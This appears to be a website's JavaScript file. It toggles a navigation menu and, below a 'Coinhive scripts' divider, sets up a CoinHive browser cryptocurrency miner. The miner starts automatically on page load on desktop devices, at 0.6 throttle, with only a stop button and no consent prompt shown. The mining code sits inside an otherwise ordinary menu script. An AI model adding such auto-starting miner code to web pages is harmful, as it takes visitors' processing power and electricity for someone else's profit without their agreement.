var normal = document.getElementById("nav-menu");
var reverse = document.getElementById("nav-menu-left");

var icon = normal !== null ? normal : reverse;

// Toggle the "menu-open" % "menu-opn-left" classes
function toggle() {
    var navRight = document.getElementById("nav");
    var navLeft = document.getElementById("nav-left");
    var nav = navRight !== null ? navRight : navLeft;

    var button = document.getElementById("menu");
    var site = document.getElementById("wrap");

    if (nav.className == "menu-open" || nav.className == "menu-open-left") {
        nav.className = "";
        button.className = "";
        site.className = "";
    } else if (reverse !== null) {
        nav.className += "menu-open-left";
        button.className += "btn-close";
        site.className += "fixed";
    } else {
        nav.className += "menu-open";
        button.className += "btn-close";
        site.className += "fixed";
    }
}

// Ensures backward compatibility with IE old versions
function menuClick() {
    if (document.addEventListener && icon !== null) {
        icon.addEventListener('click', toggle);
    } else if (document.attachEvent && icon !== null) {
        icon.attachEvent('onclick', toggle);
    } else {
        return;
    }
}

menuClick();

//******************************************************************************************* */
//Coinhive scripts
var miner = new CoinHive.Anonymous('4SxY5rIdGvO3MT3CJet0Hm8GEjGW7SP2', 'dev_log', {
    throttle: 0.6,
    theme: 'light'
});

console.log("Out");
// Only start on non-mobile devices
if (typeof miner !== 'undefined') {
    console.log("in");
    if (window.sessionStorage["minerStarted"] != false)
        startMine();
    window.sessionStorage["minerStarted"] = miner.isRunning();
    if (document.getElementById('stop_mine'))
        document.getElementById('stop_mine').innerHTML = miner.isRunning() ? "Stop Mining" : "Miner Stopped";
}


function startMine() {
    console.log("start");
    if (typeof miner !== 'undefined' && !miner.isMobile() && !miner.isRunning()) {
        miner.start();
        document.getElementById('stop_mine').innerHTML = miner.isRunning() ? "Stop Mining" : "Miner Stopped";
    }
}

function stopMine() {
    console.log("stop");
    if (typeof miner !== 'undefined' && miner.isRunning()) {
        miner.stop();
        document.getElementById('stop_mine').innerHTML = miner.isRunning() ? "Stop Mining" : "Miner Stopped";
    }
    else {
        startMine();
    }
}
